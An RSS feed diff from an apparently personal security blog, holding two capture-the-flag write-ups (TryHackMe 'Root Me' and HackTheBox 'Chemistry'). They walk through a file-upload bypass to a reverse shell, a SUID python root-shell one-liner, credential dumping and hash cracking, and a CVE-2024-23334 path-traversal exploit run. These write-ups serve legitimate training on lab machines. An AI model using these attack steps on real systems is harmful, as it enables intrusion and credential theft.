@@ -1,0 +1,416 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux on SolarSpectre</title><link>https://solarspectre.github.io/tags/linux/</link><description>Recent content in Linux on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 05 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml"/><item><title>THM Root Me - Writeup</title><link>https://solarspectre.github.io/p/thm-root-me-writeup/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/thm-root-me-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/cover.png" alt="Featured image of post THM Root Me - Writeup" /&gt;&lt;p&gt;Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p"&gt;|&lt;/span&gt; tee initialScan.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/1.png"
+width="526"
+height="701"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_9c53525f83bf454b.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_c333d88834b69866.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="75"
+data-flex-basis="180px"
+&gt;
+once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/2.png"
+width="647"
+height="411"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_d5498e0f5e48e977.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_b1b043e898df6153.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="157"
+data-flex-basis="377px"
+&gt;
+Now, the scan shows that the machine is hosting a web server with Apache, we can take a look at the directories the website has with gobuster&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gobuster dir -t &lt;span class="m"&gt;45&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&amp;lt;ip&amp;gt;/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/3.png"
+width="662"
+height="412"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_58353679a81d8403.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_9dd1b6fde54a44b9.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="385px"
+&gt;&lt;/p&gt;
+&lt;h3 id="task-2"&gt;Task 2
+&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;How many ports are open? 2
+What version of Apache is running? 2.4.29
+What service is running on port 22? SSH
+What is the hidden directory? /panel/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;p&gt;Visiting the website shows us this
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/4.png"
+width="972"
+height="345"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_cc81225b523a90b0.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_67f4a1f1d982539f.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="281"
+data-flex-basis="676px"
+&gt;
+and going to the /panel route shows a file upload page
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/5.png"
+width="1072"
+height="813"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_75fa1584ddc2e02f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_a36a5ccacd0c767d.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="131"
+data-flex-basis="316px"
+&gt;
+There&amp;rsquo;s an arbitrary file upload vulnerability in this page, allowing us to upload a maliciously crafted php file that we can use to upload and execute a reverse shell, you can use this shell from pentestmonkey
+&lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"
+&gt;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/6.png"
+width="674"
+height="634"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_28dc4c913f1a2e6f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_306e548438f0d55d.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="255px"
+&gt;&lt;/p&gt;
+&lt;p&gt;But php is not allowed to be uploaded, we can bypass this validation changing the file extension to be php5&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/7.png"
+width="613"
+height="603"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_6841a7345ed24010.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_c1eeaf36a3415c35.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="101"
+data-flex-basis="243px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Then start a listener with netcat:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nc -lvnp &lt;span class="m"&gt;4242&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;navigate to the route where your file is uploaded, for example: /uploads/shell.php5
+and you got the shell&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/8.png"
+width="542"
+height="188"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_265562d5df2d7729.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_c839516de95e6fca.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Once obtained the shell, let&amp;rsquo;s find the flag and get it!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find / -name user.txt 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat /var/www/user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Find binaries with SUID permissions that allow users to execute the binary with the permissions of the owner of the file, rather than the user who runs the command (most of the times is root).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And look at that, python? Let&amp;rsquo;s check what user is the owner of the binary&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -la /usr/bin/python
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Sweet! it&amp;rsquo;s root. You can use gtfobins to look for info about a binary you can possibly use to escalate privileges:
+&lt;a class="link" href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener"
+&gt;https://gtfobins.github.io/gtfobins/python/&lt;/a&gt;
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/10.png"
+width="833"
+height="247"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_67200d7dbc8eec37.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_542ba0758df375d6.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="809px"
+&gt;
+we can execute a oneliner to spawn a shell as root and obtain the final flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/python -c &lt;span class="s1"&gt;&amp;#39;import os; os.execl(&amp;#34;/bin/sh&amp;#34;,&amp;#34;sh&amp;#34;,&amp;#34;-p&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/9.png"
+width="514"
+height="74"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_dd7f58f0fc440341.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_9c49c8e7a0df4b64.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="694"
+data-flex-basis="1667px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat /root/root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;and you got the root flag!!&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like Arbitrary File Uploads and exploiting binaries with SUID permissions to escalate privileges.&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoyed it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item><item><title>HTB Chemistry - Writeup</title><link>https://solarspectre.github.io/p/htb-chemistry-writeup/</link><pubDate>Thu, 20 Feb 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-chemistry-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/cover.png" alt="Featured image of post HTB Chemistry - Writeup" /&gt;&lt;p&gt;Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p"&gt;|&lt;/span&gt; tee initialScan.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/1.png"
+width="797"
+height="615"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_57bd9480770c7579.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_155c8e7454c49020.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="311px"
+&gt;
+once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/2.png"
+width="736"
+height="362"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_676310d6f9b6d8df.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_d717babb291fc7de.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="203"
+data-flex-basis="487px"
+&gt;
+Now, the scan shows that the machine is hosting a web server with Python, we can take a look at the website to investigate more using burpsuite as a proxy to intercept all the traffic.
+Register an account and login to it.&lt;/p&gt;
+&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;p&gt;There&amp;rsquo;s an Arbitrary code execution vulnerability in the dashboard, allowing us to upload a maliciously crafted cfi file that we can use to upload and execute a reverse shell
+&lt;a class="link" href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" target="_blank" rel="noopener"
+&gt;https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f&lt;/a&gt;
+Just upload it and view it to execute the reverse shell&lt;/p&gt;
+&lt;p&gt;Once obtained the shell, let&amp;rsquo;s enumerate the contents in the directory
+&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/3.png"
+width="451"
+height="89"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_ac257078e4b5d7ad.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_c6e85f7cfa51a7c5.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="506"
+data-flex-basis="1216px"
+&gt;&lt;/p&gt;
+&lt;p&gt;There&amp;rsquo;s a users table where they store the credentials&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlite3 database.db &lt;span class="s1"&gt;&amp;#39;select * from user;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/4.png"
+width="544"
+height="326"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_6795b5d12c6eae49.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_49c92ef2b740dbec.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="166"
+data-flex-basis="400px"
+&gt;&lt;/p&gt;
+&lt;p&gt;You can crack it with hashcat&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;hashcat -m &lt;span class="m"&gt;0&lt;/span&gt; creds.txt rockyou.txt --user
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;You can try the credentials you obtained to login to the dashboard, maybe they used the same credentials to login to ssh&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/5.png"
+width="452"
+height="72"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_414c292065e10b97.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_e87de07bdd1c06e0.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="627"
+data-flex-basis="1506px"
+&gt;&lt;/p&gt;
+&lt;p&gt;rosa&amp;hellip; why?
+anyways, here&amp;rsquo;s your user flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Find other ports that the host is using but aren&amp;rsquo;t public&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;netstat -tuln
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/6.png"
+width="605"
+height="179"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_194f95f62c8cbeb4.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_72dfd5d65b7e667e.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="811px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Using port forward, we can see the contents of that page&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ssh -L 5555:localhost:8080 rosa@10.10.11.38
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/9.png"
+width="1185"
+height="562"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_6ffb099e42e9af03.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_fff8a48ba18fa328.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="210"
+data-flex-basis="506px"
+&gt;&lt;/p&gt;
+&lt;p&gt;we can also use whatweb to see the technologies that the page uses&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whatweb http://localhost:5555
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/8.png"
+width="856"
+height="35"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_9b6ca95ab9731b99.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_aaa1b6a0e5c9e701.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="2445"
+data-flex-basis="5869px"
+&gt;&lt;/p&gt;
+&lt;p&gt;look for directories with gobuster&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/7.png"
+width="520"
+height="261"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_9515a105f408ed59.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_96b7ec983c9c26d5.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+&gt;&lt;/p&gt;
+&lt;p&gt;looking for vulnerabilities of the website technologies you can find the CVE-2024-23334
+for the &lt;strong&gt;Aiohttp&lt;/strong&gt; version that the website is using, here&amp;rsquo;s a python script that exploits it:
+&lt;a class="link" href="https://github.com/wizarddos/CVE-2024-23334" target="_blank" rel="noopener"
+&gt;https://github.com/wizarddos/CVE-2024-23334&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python exploit.py -u &lt;span class="s2"&gt;&amp;#34;http://localhost:5555&amp;#34;&lt;/span&gt; -f &lt;span class="s2"&gt;&amp;#34;/root/root.txt&amp;#34;&lt;/span&gt; -d &lt;span class="s2"&gt;&amp;#34;/assets&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/10.png"
+width="479"
+height="250"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_121c06fa7e010e4c.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_ccb4b7b2f0a9c65d.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="191"
+data-flex-basis="459px"
+&gt;&lt;/p&gt;
+&lt;p&gt;and you got the root flag!!&lt;/p&gt;
